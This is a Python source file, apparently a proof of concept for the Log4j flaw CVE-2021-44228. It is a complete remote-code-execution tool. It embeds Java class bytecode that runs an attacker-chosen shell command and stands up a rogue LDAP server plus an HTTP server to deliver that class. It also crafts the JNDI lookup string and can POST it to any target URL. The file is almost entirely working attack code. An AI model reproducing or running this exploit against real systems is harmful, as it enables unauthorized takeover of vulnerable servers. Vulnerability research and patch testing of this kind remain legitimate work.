"""
Pure Python3 PoC for CVE-2021-44228.

alexandre-lavoie
"""

import argparse
import http.client
import http.server
import logging
import multiprocessing
import re
import socket
import socketserver
import struct
import time
import urllib.parse
from typing import Dict, Tuple, Union, List

# Built-in java classes bytes. These were generated from the `./java/*.java` files.
JAVA_CLASSES: Dict[str, bytes] = {
    "any": b"\xca\xfe\xba\xbe\x00\x00\x00<\x00\x1d\n\x00\x02\x00\x03\x07\x00\x04\x0c\x00\x05\x00\x06\x01\x00\x10java/lang/Object\x01\x00\x06<init>\x01\x00\x03()V\n\x00\x08\x00\t\x07\x00\n\x0c\x00\x0b\x00\x0c\x01\x00\x11java/lang/Runtime\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x08\x00\x0e\x01\x00\x03###\n\x00\x08\x00\x10\x0c\x00\x11\x00\x12\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/lang/Process;\x07\x00\x14\x01\x00\x13java/lang/Exception\x07\x00\x16\x01\x00\x07Exploit\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x08<clinit>\x01\x00\rStackMapTable\x01\x00\nSourceFile\x01\x00\x0cExploit.java\x00!\x00\x15\x00\x02\x00\x00\x00\x00\x00\x02\x00\x01\x00\x05\x00\x06\x00\x01\x00\x17\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x18\x00\x00\x00\x06\x00\x01\x00\x00\x00\x01\x00\x08\x00\x19\x00\x06\x00\x01\x00\x17\x00\x00\x00C\x00\x02\x00\x01\x00\x00\x00\x0e\xb8\x00\x07\x12\r\xb6\x00\x0fW\xa7\x00\x04K\xb1\x00\x01\x00\x00\x00\t\x00\x0c\x00\x13\x00\x02\x00\x18\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x04\x00\t\x00\x05\x00\r\x00\x06\x00\x1a\x00\x00\x00\x07\x00\x02L\x07\x00\x13\x00\x00\x01\x00\x1b\x00\x00\x00\x02\x00\x1c",
    "linux": b'\xca\xfe\xba\xbe\x00\x00\x00<\x00#\n\x00\x02\x00\x03\x07\x00\x04\x0c\x00\x05\x00\x06\x01\x00\x10java/lang/Object\x01\x00\x06<init>\x01\x00\x03()V\n\x00\x08\x00\t\x07\x00\n\x0c\x00\x0b\x00\x0c\x01\x00\x11java/lang/Runtime\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x07\x00\x0e\x01\x00\x10java/lang/String\x08\x00\x10\x01\x00\x07/bin/sh\x08\x00\x12\x01\x00\x02-c\x08\x00\x14\x01\x00\x03###\n\x00\x08\x00\x16\x0c\x00\x17\x00\x18\x01\x00\x04exec\x01\x00(([Ljava/lang/String;)Ljava/lang/Process;\x07\x00\x1a\x01\x00\x13java/lang/Exception\x07\x00\x1c\x01\x00\x0cLinuxExploit\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x08<clinit>\x01\x00\rStackMapTable\x01\x00\nSourceFile\x01\x00\x11LinuxExploit.java\x00!\x00\x1b\x00\x02\x00\x00\x00\x00\x00\x02\x00\x01\x00\x05\x00\x06\x00\x01\x00\x1d\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x1e\x00\x00\x00\x06\x00\x01\x00\x00\x00\x01\x00\x08\x00\x1f\x00\x06\x00\x01\x00\x1d\x00\x00\x00T\x00\x05\x00\x01\x00\x00\x00\x1f\xb8\x00\x07\x06\xbd\x00\rY\x03\x12\x0fSY\x04\x12\x11SY\x05\x12\x13S\xb6\x00\x15W\xa7\x00\x04K\xb1\x00\x01\x00\x00\x00\x1a\x00\x1d\x00\x19\x00\x02\x00\x1e\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x04\x00\x1a\x00\x05\x00\x1e\x00\x06\x00 \x00\x00\x00\x07\x00\x02]\x07\x00\x19\x00\x00\x01\x00!\x00\x00\x00\x02\x00"'
}
INJECTION_TAG = "###"

class Serializer():
    """
    Stack-based Serialization utility.
    """

    __payload: bytes
    __size_stack: bytes

    def __init__(self):
        self.__payload = b""
        self.__size_stack = []

    def push(self, data: bytes) -> "Serializer":
        self.__last = data
        self.__payload = data + self.__payload
        return self

    def pop_size(self) -> "Serializer":
        return self.push(bytes([len(self.__payload) - self.__size_stack.pop()]))

    def push_size(self, count=1) -> "Serializer":
        for _ in range(count):
            self.__size_stack.append(len(self.__payload))

        return self

    def build(self) -> bytes:
        return self.__payload

    def __repr__(self) -> str:
        return f"Serializer{self.__payload}"

class JavaClass():
    """
    Wrapper for Java class bytecode.
    """

    __raw: bytes

    def __init__(self, raw: bytes):
        self.__raw = raw

    @classmethod
    def load(cls, path: str) -> "JavaClass":
        with open(path, "rb") as h:
            raw = h.read()

        if not raw.startswith(b"\xca\xfe\xba\xbe"):
            raise Exception(f"Trying to load non-compiled Java class `{path}`.")

        return JavaClass(raw)

    @classmethod
    def str_size(cls, data: str) -> bytes:
        return b"\x01" + struct.pack("!H", len(data))

    @property
    def raw(self) -> bytes:
        return self.__raw

    @property
    def name(self) -> str:
        return re.findall(b"([a-zA-Z0-9]*)\.java", self.__raw)[0].decode()

    def inject(self, payload: Union[str, bytes]):
        if isinstance(payload, str):
            payload = payload.encode()

        if not INJECTION_TAG.encode() in self.__raw:
            raise Exception(f"No {INJECTION_TAG}` tag to inject in code.")

        index = self.__raw.index(INJECTION_TAG.encode())

        self.__raw = self.__raw[:index-3] + self.str_size(payload) + payload + self.__raw[index+3:]

    def __repr__(self) -> str:
        return f"JavaClass({self.__raw})"

class LDAPResponse():
    """
    Builder for LDAP query response.
    """

    __query_name: str
    __attributes: dict

    def __init__(self, query_name: str, attributes: dict):
        self.__query_name = query_name
        self.__attributes = attributes

    def serialize(self) -> bytes:
        s = Serializer()
        s.push_size(2)
        for k, v in reversed(self.__attributes.items()):
            s.push_size(3).push(v.encode()).pop_size().push(b"\x04").pop_size().push(b"1")
            s.push_size().push(k.encode()).pop_size().push(b"\x04").pop_size().push(b"0")

        s.push(b"0\x81\x82")
        s.push_size().push(self.__query_name.encode()).pop_size().push(b"\x04").pop_size()
        s.push(b"\x02\x01\x02d\x81").pop_size().push(b"0\x81")

        SUCCESS_RESPONSE = b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00"
        return s.build() + SUCCESS_RESPONSE

class LDAPHandler(socketserver.BaseRequestHandler):
    """
    Malicious query handler.
    """

    __java_class: JavaClass
    __path: str

    def __init__(self, java_class: JavaClass, path: str):
        self.__java_class = java_class
        self.__path = path

    def __call__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def handle(self):
        handshake = self.request.recv(8096)

        self.request.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")

        time.sleep(0.5)

        query = self.request.recv(8096)

        if len(query) < 10:
            return

        query_name = query[9:9+query[8:][0]].decode()

        response = LDAPResponse(query_name, {
            "javaClassName": "foo", 
            "javaCodeBase": self.__path, 
            "objectClass": "javaNamingReference", 
            "javaFactory": self.__java_class.name
        })
        self.request.sendall(response.serialize())

        time.sleep(0.5)

        acknowledge = self.request.recv(8096)

class HTTPHandler(http.server.BaseHTTPRequestHandler):
    """
    Malicious fetch handler.
    """

    __java_class: JavaClass

    def __init__(self, java_class: JavaClass):
        self.__java_class = java_class

    def __call__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/octet-stream")
        self.end_headers()

        self.wfile.write(self.__java_class.raw)

class Log4RCE():
    """
    Main handler for Log4RCE exploit.
    """

    __process: List[multiprocessing.Process]
    __local_ports: Dict[str, int]
    __remote_hosts: Dict[str, str]
    __remote_ports: Dict[str, int]
    __java_class: JavaClass

    def __init__(self, local_ports: Dict[str, int], remote_hosts: Dict[str, str], remote_ports: Dict[str, int], java_class: JavaClass):
        self.__process = []
        self.__local_ports = local_ports
        self.__remote_hosts = remote_hosts
        self.__remote_ports = remote_ports
        self.__java_class = java_class

    @property
    def jndi_ldap_tag(self):
        return f"${{jndi:ldap://{self.__remote_hosts['ldap']}:{self.__remote_ports['ldap']}/Log4RCE}}"

    @property
    def target_url(self) -> str:
        return f"http://{self.__remote_hosts['http']}:{self.__remote_ports['http']}/"

    def _start_process(self, target: any):
        process = multiprocessing.Process(target=target)
        self.__process.append(process)
        process.start()

    def _http_process(self):
        with http.server.HTTPServer(("127.0.0.1", self.__local_ports["http"]), HTTPHandler(self.__java_class)) as server:
            server.serve_forever()

    def start_http(self):
        logging.info(f"HTTP -> Running on local port {self.__local_ports['http']}")
        logging.info(f"Target Class -> {self.target_url + self.__java_class.name + '.class'}")
        self._start_process(target=self._http_process)

    def _ldap_process(self):
        with socketserver.TCPServer(("127.0.0.1", self.__local_ports["ldap"]), LDAPHandler(self.__java_class, self.target_url)) as server:
            server.serve_forever()

    def start_ldap(self):
        logging.info(f"LDAP -> Running on local port {self.__local_ports['ldap']}")
        self._start_process(target=self._ldap_process)

    def exploit(self):
        logging.info(f"Payload -> {self.jndi_ldap_tag}")
        while True:
            pass

    def start(self):
        self.start_http()
        self.start_ldap()

        time.sleep(1)

        self.exploit()

        time.sleep(1)

        for process in self.__process:
            process.kill()

class HTTPLog4RCE(Log4RCE):
    """
    An overload of Log4RCE to automatically POSTs to a URL using form data.
    """

    url: str
    data: str

    def exploit(self):
        logging.info(f"HTTP -> Sending payload to {self.url}")

        parsed_url = urllib.parse.urlparse(self.url.replace(INJECTION_TAG, self.jndi_ldap_tag))

        if parsed_url.scheme == "https":
            conn_class = http.client.HTTPSConnection
        else:
            conn_class = http.client.HTTPConnection

        if ":" in parsed_url.netloc:
            host, port = parsed_url.netloc.split(":")
            conn = conn_class(host, int(port))
        elif parsed_url.scheme == "https":
            conn = conn_class(parsed_url.netloc, 443)
        else:
            conn = conn_class(parsed_url.netloc, 80)

        post_data = self.data.replace(INJECTION_TAG, self.jndi_ldap_tag)
        conn.request("POST", "/", post_data, {"Content-Type": "application/x-www-form-urlencoded"})

def main():
    parser = argparse.ArgumentParser(description="All-In-One Log4JRCE by alexandre-lavoie")

    parser.add_argument("--java_class", "-j", help="The Java class file to run on the target.", default=None)
    parser.add_argument("--target", "-b", help="The built-in Java class to run on the target.", choices=JAVA_CLASSES.keys(), default="any")
    parser.add_argument("--payload", "-p", help="The payload to run on the target.", default=None)
    parser.add_argument("--http_port", "-hl", help="The local port to serve the HTTP server.", type=int, default=1337)
    parser.add_argument("--http_rhost", "-hh", help="The remote host name that serves the HTTP server.", default="127.0.0.1")
    parser.add_argument("--http_rport", "-hr", help="The remote port where the HTTP server will be exposed.", type=int, default=None)
    parser.add_argument("--ldap_port", "-ll", help="The local port to run the LDAP server.", type=int, default=1387)
    parser.add_argument("--ldap_rhost", "-lh", help="The remote host name that serves the LDAP server.", default="127.0.0.1")
    parser.add_argument("--ldap_rport", "-lr", help="The remote port to where the LDAP server will be exposed.", type=int, default=None)

    parser_modes = parser.add_subparsers(help="Log4RCE modes.")

    parser_manual = parser_modes.add_parser("manual", help="Mode to enter JNDI tag manually.")

    parser_http = parser_modes.add_parser("http", help="Mode to send HTTP requests.")
    parser_http.add_argument("--url", "-u", help="The target URL.", required=True)
    parser_http.add_argument("--data", "-d", help="The form data to inject.", required=True)

    args = parser.parse_args()

    local_ports = {
        "http": args.http_port, 
        "ldap": args.ldap_port
    }

    remote_hosts = {
        "http": args.http_rhost,
        "ldap": args.ldap_rhost
    }

    remote_ports = {
        "http": args.http_rport if args.http_rport else local_ports["http"],
        "ldap": args.ldap_rport if args.ldap_rport else local_ports["ldap"],
    }

    if args.java_class:
        java_class = JavaClass.load(args.java_class)
    else:
        java_class = JavaClass(JAVA_CLASSES[args.target])

    if args.payload:
        java_class.inject(args.payload)

    if args.url:
        log4rce_class = HTTPLog4RCE
    else:
        log4rce_class = Log4RCE


    log4rce = log4rce_class(
        local_ports=local_ports,
        remote_hosts=remote_hosts,
        remote_ports=remote_ports,
        java_class=java_class
    )

    if args.url:
        log4rce.url = args.url
        log4rce.data = args.data

    log4rce.start()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    main()
